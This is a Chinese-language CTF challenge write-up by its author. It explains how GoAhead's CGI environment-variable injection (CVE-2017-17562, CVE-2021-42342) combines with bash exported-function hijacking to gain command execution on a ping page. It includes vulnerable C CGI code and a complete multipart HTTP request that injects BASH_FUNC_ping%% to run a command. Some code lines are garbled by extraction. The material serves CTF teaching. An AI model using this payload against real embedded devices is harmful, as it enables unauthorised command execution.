1
pingOrce出题⼈writeup ---种环境变量注⼊劫
持bash的实际利⽤场景
前⾔
GoAhead
GoAhead + bash
参考
前不久p⽜分享了⼀个利⽤环境变量注⼊劫持bash的技巧. 
当时我就在想这种环境变量的注⼊有没有什么⽐较通⽤的场景。⼀般遇到的环境变量注⼊基本上都是直
接使⽤ld_preload解决问题。p⽜的这种新的环境变量注⼊的利⽤技巧，有没有什么特殊的利⽤⾯呢。 
   嵌⼊式设备常⽤的Web服务器 GoAhead 出现过环境变量注⼊漏洞 CVE-2017-17562 和 CVE-2021-
42342。 
漏洞的原理很简单：服务器会把收到的CGI请求参数直接写⼊到环境变量中。 
CVE-2017-17562 的修复⽅案也很简单：在写⼊的环境变量前加 CGI_前缀 添加⿊名单过滤（实际上⽆
效）。
但是这补丁并没有完全修复。
在 multipart 表单请求遗漏了请求参数的处理  ⿊名单也没起作⽤ 所以就有了CVE-2021-42342  
当时我在复现 CVE-2017-17562和CVE-2021-42342 时遇到了⼀个问题. 
我在上传⽂件时发⽣了500错误  控制台⽆任何错误输出  阅读源码后我发现  
GoAhead 上传⽂件时会向⼀个固定的临时⽂件夹写⼊临时⽂件  默认为--home参数提供的⽬录下的tmp
⽬录
前⾔
GoAhead  
2
如果⽬录不存在 或者是⽆法写⼊⽂件，就⽆法完成上传流程。（在后来搜索漏洞分析的才发现了p⽜的⽂
章已经写过了我遇到的坑 还有⼀些其他的⽞学问题） 
在创建tmp⽬录后，我成功的完成了漏洞复现。 
这时我想到了⼀个问题：
 嵌⼊式设备⼤多都是只读⽂件系统，即使是可写也没有创建这个临时⽬录。 
那么，这个漏洞在实际的场景下应该很难利⽤。
当时没有其他⽅法只能⽌步于此。  直到我遇到了p⽜的这篇⽂章。 
⼀些嵌⼊式设备会有执⾏系统命令的场景。
⽐如ping 路由跟踪 等等。 
在这个场景下并结合p⽜的bash劫持，就可以完美的完成命令执⾏⽬标。 
随便构建⼀个cgi 
GoAhead + bash 
3
web功能代码
C
复制代码
int isValidIp4 (char *str) {
    int segs = 0;   /* Segment count. */
    int chcnt = 0;  /* Character count within segment. */
    int accum = 0;  /* Accumulator for segment. */
    /* Catch NULL pointer. */
    if (str == NULL)
        return 0;
    /* Process every character in string. */
    while (*str != '\0') {
        /* Segment changeover. */
        if (*str == '.') {
            /* Must have some digits in segment. */
            if (chcnt == 0)
                return 0;
            /* Limit number of segments. */
            if (++segs == 4)
                return 0;
            /* Reset segment values and restart loop. */
            chcnt = accum = 0;
            str++;
            continue;
        }
        /* Check numeric. */
        if ((*str  '9'))
            return 0;
        /* Accumulate and check segment. */
        if ((accum = accum * 10 + *str - '0') > 255)
            return 0;
        /* Advance other segment specific stuff and continue loop. */
        chcnt++;
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
4
使⽤p⽜的 bash环境变量注⼊劫持ping 命令实现任意代码执⾏ 
        str++;
    }
    /* Check enough segments and enough characters in last segment. */
    if (segs != 3)
        return 0;
    if (chcnt == 0)
        return 0;
    /* Address okay. */
    return 1;
}
printf("Network looking glass\r\n");
printf("\r\n");
printf("\r\n");
printf("\r\n");
printf("\r\n");
fflush(stdout);
if (numQueryKeys != 0) {
    printf("result\r\n");
    for (i = 0; i $ping -c 4 -w15 %s\r\n",queryKeys[i+1]);
                fflush(stdout);
                sprintf(buffer, "ping -c 4 -w15 %s", queryKeys[i+1]);
                system(buffer);
                fflush(stdout);
                printf("");
            }else{
                printf("invalid ip\r\n");
            }
        }
    }
}
printf("\r\n");
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
5
POST /cgi-bin/ping?fdhtf=1.1.1.1 HTTP/1.1 
Host: 1.1.1.1 
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 
Accept-Encoding: gzip, deﬂate
Content-Type: multipart/form-data; boundary=---------------------------123456 
Connection: close 
-----------------------------123456 
Content-Disposition: form-data; name="BASH_FUNC_ping%%"
() { cat /ﬂag; } 
-----------------------------123456-- 
https://tttang.com/archive/1450/ 
https://www.potato.gold/article/79.html 
https://www.leavesongs.com/PENETRATION/goahead-en-injection-cve-2021-42342.html 
参考
6
pycc 题后话 
 在公开⼀个半⼩时后出了第⼀解（2⼈ ⼏乎同时） 
当天只有2解 
第三天出第四解开始⼤批量上分
不愧是pycc 居然有⼏百个全栈⼤⽼做出来了这道题